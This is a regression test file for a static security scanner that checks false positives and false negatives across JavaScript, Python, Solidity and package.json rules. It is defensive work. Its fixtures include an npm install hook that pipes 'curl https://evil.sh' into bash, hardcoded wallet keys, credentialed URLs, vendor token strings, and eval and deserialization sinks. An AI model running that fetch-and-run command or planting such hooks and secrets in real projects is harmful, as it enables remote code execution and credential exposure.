// REGRESSION SUITE — every case here was a confirmed false-positive or false-negative
// found by adversarial review. Each is now locked so it can never silently regress.
// Format: a code line that MUST (or MUST NOT) produce a given ruleId.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { scan } from '../src/index.js';

async function scanCode(name, content, probes) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'alltest-reg-'));
  await fs.writeFile(path.join(dir, name), content);
  const r = await scan({ root: dir, probes });
  return new Set(r.findings.map((f) => f.ruleId));
}
// Assemble vendor tokens from fragments so the CONTIGUOUS secret pattern never appears in
// committed source. alltest reconstructs the full token in memory and detects it at
// runtime, but GitHub secret scanning (and any fork's scanner) sees only harmless pieces —
// so a scanner's own test suite never raises false "exposed secret" alerts. (See #1.)
const j = (...parts) => parts.join('');

const mustNot = async (name, code, ruleId, probes) => {
  const rules = await scanCode(name, code, probes);
  assert.ok(!rules.has(ruleId), `FALSE POSITIVE regressed: "${code.trim()}" should NOT trigger ${ruleId}`);
};
const must = async (name, code, ruleId, probes) => {
  const rules = await scanCode(name, code, probes);
  assert.ok(rules.has(ruleId), `FALSE NEGATIVE regressed: "${code.trim()}" SHOULD trigger ${ruleId}`);
};

// ---------- confirmed FALSE POSITIVES that must stay clean ----------
test('FP: regex/ORM .exec(a+b) is not command injection', () => mustNot('a.js', 'const m = tokenPattern.exec(input + suffix);\n', 'child-process-concat'));
test('FP: Math.random()*gridSize is not an insecure token', () => mustNot('a.js', 'const offset = Math.random() * gridSize;\n', 'insecure-random-token'));
test('FP: epk (ephemeral public key) is not a private key', () => mustNot('a.js', 'const epk = "0x1c9e4f2a7b8c1d0e3f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e";\n', 'eth-private-key'));
test('FP: profile.message in a response is not an error leak', () => mustNot('a.js', 'res.json({ text: profile.message });\n', 'error-message-to-response'));
test('FP: user.stack (techStack) is not a stack-trace leak', () => mustNot('a.js', 'res.json({ techStack: user.stack });\n', 'stack-in-response'));
test('FP: pwd = "/var/www" (a path) is not a hardcoded password', () => mustNot('a.js', 'const pwd = "/var/www/html/current";\n', 'hardcoded-password'));
test('FP: chart { stack: true } is not a verbose-error flag', () => mustNot('a.js', 'const chart = { stack: true, type: "bar" };\n', 'verbose-error-flag'));
test('FP: const debuggerAttached = false is not a debugger stmt', () => mustNot('a.js', 'const debuggerAttached = false;\n', 'debugger-stmt'));
test('FP: assert author.id is not assert-auth', () => mustNot('a.py', 'assert author.id == expected_author\n', 'py-assert-auth'));
test('FP: URL slug starting sk- is not an OpenAI key', () => mustNot('a.js', 'const marketingUrl = "https://blog.acme.co/sk-electronic-signature-guide-2024";\n', 'openai-key'));
test('FP: static innerHTML constant string is allowed', () => mustNot('a.js', 'panel.innerHTML = "";\n', 'dom-xss-sink'));
test('FP: SHA-256 named merkleRoot is not a private key (camelCase skip)', () => mustNot('a.js', 'const merkleRoot = "5fec1c7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c57e9";\n', 'eth-private-key-loose'));
test('FP: jsconfig.json with comments is valid JSONC', () => mustNot('jsconfig.json', '{\n  // path aliases\n  "compilerOptions": {}\n}\n', 'malformed-json'));

// ---------- confirmed FALSE NEGATIVES that must now be caught ----------
test('FN: private key in a .key FILE is scanned (walker fix)', () => must('server.key', '-----BEGIN RSA PRIVATE KEY-----\nMIIabc123\n-----END RSA PRIVATE KEY-----\n', 'private-key-pem'));
test('FN: committed id_rsa is flagged as a key file', () => must('id_rsa', 'ssh-rsa-private-body\n', 'key-file-committed', ['static/config-hygiene']));
test('FN: innerHTML += userHtml is a DOM XSS sink', () => must('a.js', 'container.innerHTML += userProvidedHtml;\n', 'dom-xss-sink'));
test('FN: indirect eval (0, eval) is caught', () => must('a.js', 'const run = (0, eval); run(userCode);\n', 'indirect-eval'));
test('FN: Function("...") without new is caught', () => must('a.js', 'const fn = Function("a", "return a + 1");\n', 'function-constructor'));
test('FN: string-arg setTimeout is eval-equivalent', () => must('a.js', 'setTimeout("doWork()", delay);\n', 'string-arg-timer'));
test('FN: hardcoded key in new Wallet() is critical', () => must('a.js', 'const w = new ethers.Wallet("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d");\n', 'eth-wallet-literal'));
test('FN: credentials in ftp:// URL are caught', () => must('a.js', 'const u = "ftp://admin:S3cr3tPazz9@host.internal.net/data";\n', 'connection-string-creds'));
test('FN: Slack app token (xapp-) is caught', () => must('a.js', `const t = "${j('xapp', '-1-A012BCDEF34-9087654321-abcdefADCBEF9087qrstuv')}";\n`, 'slack-token'));
test('FN: Stripe webhook secret (whsec_) is caught', () => must('a.js', `const w = "${j('whsec', '_9aB7cD5eF3gH1iJ0kLmN2oPqRsTuVwXyz')}";\n`, 'stripe-webhook'));
test('FN: torch.load untrusted deserialization is caught', () => must('a.py', 'model = torch.load(untrusted_path)\n', 'py-unsafe-deserialize'));
test('FN: pickle.Unpickler is caught', () => must('a.py', 'obj = pickle.Unpickler(f).load()\n', 'py-unsafe-deserialize'));
test('FN: tx.origin != owner is still tx-origin auth', () => must('V.sol', 'contract V { function f() public { require(tx.origin != owner); } }\n', 'tx-origin-auth'));
test('FN: range pragma is flagged', () => must('V.sol', 'pragma solidity >=0.8.0 <0.9.0;\n', 'floating-pragma-range'));
test('FN: curl|bash in an npm script is caught', () => must('package.json', '{"name":"x","version":"1.0.0","scripts":{"prepublishOnly":"curl https://evil.sh | bash"}}\n', 'script-remote-exec'));
test('FN: unbounded >= range dependency is flagged', () => must('package.json', '{"name":"x","version":"1.0.0","dependencies":{"foo":">=1.0.0"}}\n', 'wildcard-dependency'));
test('FN: optionalDependencies wildcard is scanned', () => must('package.json', '{"name":"x","version":"1.0.0","optionalDependencies":{"bar":"*"}}\n', 'wildcard-dependency'));
